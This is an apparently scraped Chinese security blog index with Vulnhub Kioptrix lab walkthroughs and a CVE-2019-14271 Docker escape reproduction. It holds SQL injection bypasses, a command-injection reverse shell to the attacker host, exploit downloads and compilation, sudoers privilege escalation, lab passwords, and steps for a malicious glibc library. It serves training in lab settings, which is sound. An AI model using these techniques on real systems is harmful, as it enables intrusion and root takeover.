[{"categories":["Èù∂Êú∫"],"content":"Vulnhub-kioptix-Level-1.3Ôºà#4Ôºâ ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["Èù∂Êú∫"],"content":"Âü∫Êú¨‰ø°ÊÅØ kali:192.168.110.10 Èù∂Êú∫:192.168.110.26 ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["Èù∂Êú∫"],"content":"‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ ‚îî‚îÄ# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 192.168.110.26 00:50:56:a3:2f:b8 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.013 seconds (127.17 hosts/sec). 4 responded GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.110.26/ ---- + http://192.168.110.26/cgi-bin/ (CODE:403|SIZE:329) ==\u003e DIRECTORY: http://192.168.110.26/images/ + http://192.168.110.26/index (CODE:200|SIZE:1255) + http://192.168.110.26/index.php (CODE:200|SIZE:1255) ==\u003e DIRECTORY: http://192.168.110.26/john/ + http://192.168.110.26/logout (CODE:302|SIZE:0) + http://192.168.110.26/member (CODE:302|SIZE:220) + http://192.168.110.26/server-status (CODE:403|SIZE:334) ---- Entering directory: http://192.168.110.26/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.26/john/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["Èù∂Êú∫"],"content":"‰∫å„ÄÅÊºèÊ¥ûÂà©Áî® ËØï‰∏ã‰∏áËÉΩÁ†Å'or'1'='1 join 'or'1'='1 ÂèØ‰ª•ÁôªÂΩï sshÁôªÂΩï Username : john Password : MyNameIsJohn john:~$ sudo su *** forbidden sudo -\u003e sudo su john:~$ id *** unknown command: id john:~$ echo os.system('/bin/bash') john@Kioptrix4:~$ id uid=1001(john) gid=1001(john) groups=1001(john) john@Kioptrix4:~$ sudo su [sudo] password for john: root@Kioptrix4:/home/john# id uid=0(root) gid=0(root) groups=0(root) ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["Èù∂Êú∫"],"content":"Vulnhub-kioptix-Level-1.2Ôºà#3Ôºâ ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["Èù∂Êú∫"],"content":"Âü∫Êú¨‰ø°ÊÅØ kali:192.168.110.10 Èù∂Êú∫:192.168.110.25 ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["Èù∂Êú∫"],"content":"‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ ‚îî‚îÄ# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 192.168.110.25 00:50:56:a3:ce:34 VMware, Inc. 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.047 seconds (125.06 hosts/sec). 4 responded ‚îî‚îÄ# nmap -sV 192.168.110.25 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 16:52 CST Nmap scan report for 192.168.110.25 Host is up (0.00039s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) MAC Address: 00:50:56:A3:CE:34 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds dirb http://192.168.110.25/ ---- Entering directory: http://192.168.110.25/phpmyadmin/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/lang/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/scripts/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) LotusCMS ‚îî‚îÄ# searchsploit LotusCMS -------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------- --------------------------------- LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit) | php/remote/18565.rb LotusCMS 3.0.3 - Multiple Vulnerabilities | php/webapps/16982.txt -------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["Èù∂Êú∫"],"content":"ÊºèÊ¥ûÂà©Áî® git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit ./lotusRCE.sh 192.168.110.25 Path found, now to check for vuln.... \u003c/html\u003eHood3dRob1n Regex found, site is vulnerable to PHP Code Injection! About to try and inject reverse shell.... what IP to use? 192.168.110.10 What PORT? 4444 OK, open your local listener and choose the method for back connect: 1) NetCat -e 2) NetCat /dev/tcp 3) NetCat Backpipe 4) NetCat FIFO 5) Exit #? 1 /home/www/kioptrix3.com/gallery ‚Äòcat gconfig.php‚Äô \u003c?php error_reporting(0); /* A sample Gallarific configuration file. You should edit the installer details below and save this file as gconfig.php Do not modify anything else if you don't know what it is. */ // Installer Details ----------------------------------------------- // Enter the full HTTP path to your Gallarific folder below, // such as http://www.yoursite.com/gallery // Do NOT include a trailing forward slash $GLOBALS[\"gallarific_path\"] = \"http://kioptrix3.com/gallery\"; $GLOBALS[\"gallarific_mysql_server\"] = \"localhost\"; $GLOBALS[\"gallarific_mysql_database\"] = \"gallery\"; $GLOBALS[\"gallarific_mysql_username\"] = \"root\"; $GLOBALS[\"gallarific_mysql_password\"] = \"fuckeyou\"; // Setting Details ------------------------------------------------- if(!$g_mysql_c = @mysql_connect($GLOBALS[\"gallarific_mysql_server\"], $GLOBALS[\"gallarific_mysql_username\"], $GLOBALS[\"gallarific_mysql_password\"])) { echo(\"A connection to the database couldn't be established: \" . mysql_error()); die(); }else { if(!$g_mysql_d = @mysql_select_db($GLOBALS[\"gallarific_mysql_database\"], $g_mysql_c)) { echo(\"The Gallarific database couldn't be opened: \" . mysql_error()); die(); }else { $settings=mysql_query(\"select * from gallarific_settings\"); if(mysql_num_rows($settings)!=0){ while($data=mysql_fetch_array($settings)){ $GLOBALS[\"{$data['settings_name']}\"]=$data['settings_value']; } } } } ?\u003e http://192.168.110.25/index.php?system=Admin dreg 0d3eccfb887aabd50f243b3f155c0f85 Mast3r loneferret 5badcaf789d3d1d09794d8f021f40f0e starwars Á¨¨‰∏Ä‰∏™ÂèëÁé∞Ê≤°Âï•ÂèØÁî®ÁöÑ Á¨¨‰∫å‰∏™ÂèëÁé∞ÂèØ‰ª•ÊâßË°åht loneferret@Kioptrix3:~$ sudo -l User loneferret may run the following commands on this host: (root) NOPASSWD: !/usr/bin/su (root) NOPASSWD: /usr/local/bin/ht export TERM=xterm sudo ht ÊåâF3ÊåâÈîÆÔºåÊâìÂºÄ/etc/sudoers ‚îÇ# /etc/sudoers # # This file MUST be edited with the 'visudo' command as root. # # See the man page for details on how to write a sudoers file. # Defaults env_reset # Host alias specification # User alias specification # Cmnd alias specification # User privilege specification root ALL=(ALL) ALL loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht,/bin/bash # Uncomment to allow members of group sudo to not need a password # (Note that later entries override this, so you might need to move # it further down) # %sudo ALL=NOPASSWD: ALL # Members of the admin group may gain root privileges %admin ALL=(ALL) ALL ‰ΩøÁî®sudoÊâßË°å/bin/bashÔºåÊàêÂäüÊèêÊùÉÂà∞root ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["Èù∂Êú∫"],"content":"Vulnhub-kioptix-Level-1.1(#2) ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1Ôºà#2Ôºâ","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["Èù∂Êú∫"],"content":"Âü∫Êú¨‰ø°ÊÅØ kali:192.168.110.10 Èù∂Êú∫:192.168.110.17 ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1Ôºà#2Ôºâ","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["Èù∂Êú∫"],"content":"‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ ‚îî‚îÄ# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.17 00:0c:29üá©üá™9d:0f VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 82 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 3.127 seconds (81.87 hosts/sec). 4 responded ‚îî‚îÄ# nmap -sV 192.168.110.17 -p1-65535 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 16:37 CST Nmap scan report for 192.168.110.17 Host is up (0.00023s latency). Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) 80/tcp open http Apache httpd 2.0.52 ((CentOS)) 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS)) 631/tcp open ipp CUPS 1.1 645/tcp open status 1 (RPC #100024) 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:DE:9D:0F (VMware) ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1Ôºà#2Ôºâ","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["Èù∂Êú∫"],"content":"‰∫å„ÄÅÊºèÊ¥ûÂà©Áî® ÁΩëÈ°µÁôªÂΩïÊ°ÜËØï‰∏ã‰∏áËÉΩÁ†Å' or 1='1 ÁôªÂΩïËøõÂéª 127.0.0.1;whoami 127.0.0.1;whoami PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.016 ms 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.028 ms --- 127.0.0.1 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 1999ms rtt min/avg/max/mdev = 0.016/0.023/0.028/0.007 ms, pipe 2 apache 127.0.0.1;bash -i \u003e\u0026 /dev/tcp/192.168.110.10/4444 0\u003e\u00261 nc -nvlp 4444 bash-3.00$ uname -a Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux searchsploit privilege | grep centos -i python3 -m http.server 6666 wget http://192.168.110.10:6666/9542.c gcc -o 9542 9542.c ./9542 sh-3.00# whoami root ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1Ôºà#2Ôºâ","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["Èù∂Êú∫"],"content":"Vulnhub-kioptix-Level-1Ôºà#1Ôºâ ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["Èù∂Êú∫"],"content":"Âü∫Êú¨‰ø°ÊÅØ kali:192.168.110.10 Èù∂Êú∫:192.168.110.12 ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["Èù∂Êú∫"],"content":"‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ arp-scan -l nmap -sV 192.168.110.12 Apache/1.3.20„ÄÅmod_ssl/2.8.4„ÄÅOpenSSL/0.9.6b nikto -host http://192.168.110.12/ Êâ´Âà∞ÊúâCVE-2002-0082 443Á´ØÂè£‰ΩøÁî®‰∫Ümod_sslÊúçÂä°‰∏∫2.8.4 ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["Èù∂Êú∫"],"content":"‰∫å„ÄÅÊºèÊ¥ûÂà©Áî® ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["Èù∂Êú∫"],"content":"ÊºèÊ¥ûÂà©Áî®1 Êü•ËØ¢Âà∞Êúâexp ÁºñËØë‰∏ã gcc -o exp 47080.c -lcrypto ./exp 0x6b 192.168.110.12 443 ËøôËæπÊòØÂêéÁª≠ÁöÑexploitÊ≤°Êúâ‰∏ãËΩΩÊàêÂäüÔºåÁõ¥Êé•Âú®shellÈáåÈù¢Â∞ùËØï‰ªéÈìæÊé•ÈáåÈù¢‰∏ãËΩΩËØï‰∏ã curl -O https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c python3 -m http.server 8080 nano 47080.c #‰øÆÊîπhttp ÊîπÊàêÊú¨Âú∞Âú∞ÂùÄ ‰øùÂ≠òÂêéÈáçÊñ∞ÁºñËØëËøêË°å ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:4","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["Èù∂Êú∫"],"content":"ÊºèÊ¥ûÂà©Áî®2 ÂâçÈù¢ÂèëÁé∞‰∫Ü139Á´ØÂè£ Áî®msfÊâ´Êèè‰∏Ä‰∏ã ÁâàÊú¨ÊòØ2.2.1a searchsploit samba 2.2Êâæ‰∏ãÊúâÊó†ÂèØ‰ª•Âà©Áî®ÁöÑÊºèÊ¥û searchsploit -p 10.c ÂØªÊâæË∑ØÂæÑ cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./ ÁºñËØë‰∏Ä‰∏ã ./samba -b 0 192.168.110.12 Â∑≤ÊãøÂà∞rootÊùÉÈôê ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:5","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"CVE-2019-14271ÔºöÂä†ËΩΩ‰∏çÂèó‰ø°‰ªªÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì ÂâçÁΩÆÁü•ËØÜ ÂΩìÁî®Êà∑ÊâßË°ådocker cpÂêéÔºåDockerÂÆàÊä§ËøõÁ®ã‰ºöÂêØÂä®‰∏Ä‰∏™docker-tarËøõÁ®ãÊù•ÂÆåÊàêËøôÈ°πÂ§çÂà∂‰ªªÂä°„ÄÇÊãø\"‰ªéÂÆπÂô®ÂÜÖÂ§çÂà∂Êñá‰ª∂Âà∞ÂÆø‰∏ªÊú∫‰∏ä\"‰∏∫‰æãÔºåÂÆÉ‰ºöÂàáÊç¢ËøõÁ®ãÁöÑÊ†πÁõÆÂΩï(ÊâßË°åchroot)Âà∞ÂÆπÂô®Ê†πÁõÆÂΩïÔºåÂ∞ÜÈúÄË¶ÅÂ§çÂà∂ÁöÑÊñá‰ª∂ÊàñÁõÆÂΩïÊâìÂåÖÔºåÁÑ∂Âêé‰º†ÈÄíÁªôDockerÂÆàÊä§ËøõÁ®ãÔºåDockerÂÆàÊä§ËøõÁ®ãË¥üË¥£Â∞ÜÂÜÖÂÆπËß£ÂåÖÂà∞Áî®Êà∑ÊåáÂÆöÁöÑÂÆø‰∏ªÊú∫ÁõÆÊ†áË∑ØÂæÑ„ÄÇ ÊºèÊ¥û‰ªãÁªç ÂΩìDockerÂÆø‰∏ªÊú∫‰ΩøÁî®cpÂëΩ‰ª§Êó∂Ôºå‰ºöË∞ÉÁî®ËæÖÂä©ËøõÁ®ãdocker-tarÁªÑ‰ª∂Ôºå‰ºöÂä†ËΩΩÂÆπÂô®ÂÜÖÈÉ®ÁöÑnsswitchÂä®ÊÄÅÈìæÊé•Â∫ìÔºå‰ΩÜËá™Ë∫´Âç¥Êú™Ë¢´ÂÆπÂô®ÂåñÔºåÊîªÂáªËÄÖÂèØÈÄöËøáÂä´ÊåÅÂÆπÂô®ÂÜÖÈÉ®ÁöÑnsswitchÂä®ÊÄÅÈìæÊé•Â∫ìÊù•ÂÆûÁé∞ÂØπÂÆø‰∏ªÊú∫ËøõÁ®ãÁöÑÊÅ∂ÊÑè‰ª£Á†ÅÊ≥®ÂÖ•ÔºåËé∑ÂæóÂÆø‰∏ªÊú∫‰∏ärootÊùÉÈôêÁöÑ‰ª£Á†ÅÊâßË°åËÉΩÂäõ„ÄÇ chrootÊìç‰Ωú‰∏ªË¶ÅÊòØ‰∏∫‰∫ÜÈÅøÂÖçÁ¨¶Âè∑ÈìæÊé•ÂØºËá¥ÁöÑË∑ØÂæÑÁ©øË∂äÈóÆÈ¢òÔºå‰ΩÜÊñ∞ÁöÑÈóÆÈ¢ò‰πüÂá∫Áé∞‰∫Ü„ÄÇÂ≠òÂú®ÊºèÊ¥ûÁâàÊú¨ÁöÑdocker-tar‰ºöÂä†ËΩΩÂøÖË¶ÅÁöÑÂä®ÊÄÅÈìæÊé•Â∫ìÔºå‰∏ªË¶ÅÊòØ‰ª•libnss_ÂºÄÂ§¥ÁöÑnsswitchÂä®ÊÄÅÈìæÊé•Â∫ì(libnss__*.so)„ÄÇchrootÂàáÊç¢Ê†πÁõÆÂΩïÂêéÔºådocker-tarÂ∞ÜÂä†ËΩΩÂÆπÂô®ÂÜÖÈÉ®ÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì„ÄÇ ÂΩ±ÂìçËåÉÂõ¥ Docker 19.03.0 Âà©Áî®ÊÄùË∑Ø ÊâæÂá∫docker-tarÂÖ∑‰Ωì‰ºöÂä†ËΩΩÂì™‰∫õÂÆπÂô®ÂÜÖÁöÑÂä®ÊÄÅÈìæÊé•Â∫ì„ÄÇ ‰∏ãËΩΩÂØπÂ∫îÂä®ÊÄÅÈìæÊé•Â∫ìÊ∫êÁ†ÅÔºå‰∏∫ÂÖ∂Â¢ûÂä†‰∏Ä‰∏™__attribute__((constructor))ÁöÑÂ±ûÊÄßÁöÑÂáΩÊï∞run_at_linkÔºàËØ•Â±ûÊÄßÊÑèÂë≥ÁùÄÂú®Âä®ÊÄÅÈìæÊé•Â∫ìË¢´ËøõÁ®ãÂä†ËΩΩÊó∂Ôºårun_at_linkÂáΩÊï∞‰ºöÈ¶ñÂÖàÊâßË°å),Âú®run_at_linkÂáΩÊï∞‰∏≠ÊîæÁΩÆÊàë‰ª¨Â∏åÊúõdocker-tarÊâßË°åÁöÑpayloadÔºõÁºñËØëÁîüÊàêÂä®ÊÄÅÈìæÊé•Â∫ìÊñá‰ª∂„ÄÇ ÁºñÂÜôËæÖÂä©ËÑöÊú¨breakout,Â∞ÜËæÖÂä©ËÑöÊú¨ÂíåÊ≠•È™§2ÁîüÊàêÁöÑÊÅ∂ÊÑèÂä®ÊÄÅÈìæÊé•Â∫ìÊîæÂÖ•ÊÅ∂ÊÑèÂÆπÂô®ÔºåÁ≠âÂæÖÁî®Êà∑ÂØπÂÆπÂô®ÊâßË°ådocker cpÂëΩ‰ª§ÔºåËß¶ÂèëÊºèÊ¥û„ÄÇ ","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["dockerÊºèÊ¥û"],"title":"CVE-2019-14271ÊºèÊ¥ûÂ§çÁé∞","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["‰∫ëÂéüÁîüÂÆâÂÖ®"],"content":"Êê≠Âª∫ÁéØÂ¢É ‰ΩøÁî®MetargetÊèê‰æõÁöÑÈù∂Âú∫ÁéØÂ¢É Áõ¥Êé•ÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ ./metarget cnv install cve-2019-14271 ÂÆâË£ÖÂ•ΩÂ≠òÂú®cve-2019-14271ÊºèÊ¥ûÁöÑdocker„ÄÇ ÂÆö‰ΩçÂä®ÊÄÅÈìæÊé•Â∫ì docker-tarÂêØÂä®Âêé‰ºöÂä†ËΩΩÁöÑÂÆπÂô®ÂÜÖÂä®ÊÄÅÈìæÊé•Â∫ìÔºåÊúâ‰∏§ÁßçÊñπÊ≥ïÂÆö‰Ωç„ÄÇ ÂàÜÊûêDockerÊ∫êÁ†ÅÔºåÊäΩ‰∏ùÂâ•ËåßÔºå‰∏çËøá‰πüÊØîËæÉË¥πÊó∂Èó¥ ÊâßË°å‰∏ÄÊ¨°docker cpÂëΩ‰ª§ÔºåËßÇÂØüÂú®Ëøô‰∏™ËøáÁ®ã‰∏≠ÂÆπÂô®ÂÜÖÈÉ®Âì™‰∫õÂä®ÊÄÅÈìæÊé•Â∫ìË¢´Âä†ËΩΩ‰∫Ü„ÄÇÔºàLinuxÊèê‰æõ‰∫ÜinotifyÊú∫Âà∂ÔºåÁî®Êù•ÁõëÊéßÊñá‰ª∂Á≥ªÁªüÂèòÂåñÔºâ inotify-toolsÊòØ‰∏ÄÁ≥ªÂàóÂü∫‰∫éinotifyÊú∫Âà∂ÂºÄÂèëËÄåÊàêÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÂÄüÁªÑËøô‰∫õÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑Êù•ÁõëÊéßdocker-tarÂØπÂÆπÂô®ÂÜÖÂä®ÊÄÅÈìæÊé•Â∫ìÁöÑ‰ΩøÁî®ÊÉÖÂÜµ„ÄÇ Âú®Â≠òÂú®ÊºèÊ¥ûÁöÑDockerÁéØÂ¢É‰∏≠ÔºåÈ¶ñÂÖàÊâßË°å‰∏ãÈù¢ÂëΩ‰ª§ÔºåËøêË°å‰∏Ä‰∏™ÂÆπÂô®: docker run -itd --name=test ubuntu ÁÑ∂ÂêéÔºåÊàë‰ª¨Ë¶ÅÊãøÂà∞ÂÆπÂô®Âú®ÂÆø‰∏ªÊú∫‰∏äÁöÑÁªùÂØπË∑ØÂæÑÔºåÊâçËÉΩÂØπÂÆÉËøõË°åÁõëÊéß„ÄÇÊâßË°å‰ª•‰∏ãÂëΩ‰ª§: docker exec -it test cat /proc/mounts | grep docker ËøîÂõûÁªìÊûú‰∏≠ÂåÖÂê´Á±ª‰ºº‰∏ãÈù¢ËøôÊ†∑ÁöÑÂ≠óÁ¨¶‰∏≤: workdir=/var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/work ÈÇ£‰πàÂÆπÂô®Ê†πÁõÆÂΩïÂú®ÂÆø‰∏ªÊú∫‰∏äÁöÑÁªùÂØπË∑ØÂæÑ‰∏∫: /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged Êé•ÁùÄÔºåÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§ÔºåÂú®Âè¶‰∏Ä‰∏™ÁªàÁ´Ø‰∏≠‰ΩøÁî®inotifywaitÂ∑•ÂÖ∑ÔºåÂú®ÂÆø‰∏ªÊú∫‰∏äÁõëÂê¨ÂÆπÂô®Êñá‰ª∂Á≥ªÁªü‰∏≠libÁõÆÂΩïÁöÑ‰∫ã‰ª∂: apt install -y inotify-tools inotifywait -mr /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged/lib Áé∞Âú®Â∞±ÂèØ‰ª•ÊâßË°ådocker cp‰∫ÜÔºåÊØîÂ¶ÇÔºåÊàë‰ª¨ÊâßË°å: docker cp test:/etc/passwd ./ ÁÑ∂ÂêéÂèØ‰ª•Âú®‰πãÂâçÁöÑÁªàÁ´Ø‰∏≠ÁúãÂà∞inotifywaitÁöÑËæìÂá∫Ôºå‰æãÂ¶Ç: ÂèØ‰ª•ÁúãÂà∞ÔºåÂú®ËøôÊ¨°Â§çÂà∂Êìç‰Ωú‰∏≠Ôºådocker-tarÂä†ËΩΩ‰∫Ülibnss_files-2.31.so,ÂêéÈù¢ÔºåÊàë‰ª¨ÈÄâÊã©libnss_files-2.31.so‰∏∫ÁõÆÊ†áÔºåÊûÑÈÄ†‰∏Ä‰∏™ÊÅ∂ÊÑèÂæóÂä®ÊÄÅÈìæÊé•Â∫ìÊù•ÊõøÊç¢ÂÆÉ„ÄÇ ÊûÑÂª∫Âä®ÊÄÅÈìæÊé•Â∫ì libnss_*.soÂùáÂú®Glibc‰∏≠ÔºåÊàë‰ª¨È¶ñÂÖà‰∏ãËΩΩGlibcÂ∫ì https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.bz2 ‰πãÂêéËß£ÂéãÂà∞Êú¨Âú∞ÁõÆÂΩïÔºåÊàëËøôÈáåÁöÑËØùÊòØ /root/gnu/glibc-2.31„ÄÇÁÑ∂ÂêéÂú®/root/gnuÁõÆÂΩïÊñ∞Âª∫‰∏Ä‰∏™glibc-buildÁõÆÂΩïÔºå‰Ωú‰∏∫ÊûÑÂª∫ÁõÆÂΩï„ÄÇ tar -jxvf glibc-2.31-tar.bz2 ËøõÂÖ• glibc-2.31 cd glibc-2.31 Ê≥®ÈáäÊéâglibc-2.31/MakeconfigÊñá‰ª∂‰∏≠Âæó‰∏ÄË°åË≠¶ÂëäËÆæÁΩÆÔºåÈÅøÂÖçÂä†ÂÖ•ÊÅ∂ÊÑèpayloadÂêéÁºñËØëÂ§±Ë¥•: +gccwarn-c = -Wstrict-prototypes -Wold-style-definition Êé•ÁùÄÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•Âú®Ê∫ê‰ª£Á†Å‰∏≠Ê∑ªÂä†ÊÅ∂ÊÑèpayload‰∫Ü ÂèØ‰ª•Âú®glibc-2.31/nss/nss_filesÁõÆÂΩï‰∏ã‰ªªÊÑèÊ∫êÁ†Å‰∏≠Ê∑ªÂä†payload ËøôÈáåÈÄâÊã©files-service.cÊñá‰ª∂Ôºå‰∏çÂøÖËøáÂ§öÊìç‰ΩúÔºå‰Ωú‰∏∫‰∏Ä‰∏™Ëé∑ÂèñÊéßÂà∂ÊùÉÁöÑÈÄîÂæÑÔºåÊääÁúüÊ≠£ÂÖ∑ÊúâÂ®ÅËÉÅÁöÑÊìç‰ΩúÊîæÂÖ•ÂÆπÂô®ÂÜÖ/breakoutËÑöÊú¨‰∏≠ÔºåËÆ©Âä®ÊÄÅÈìæÊé•Â∫ìÂéªÊâßË°å/breakoutËÑöÊú¨Êñá‰ª∂Âç≥ÂèØ„ÄÇ 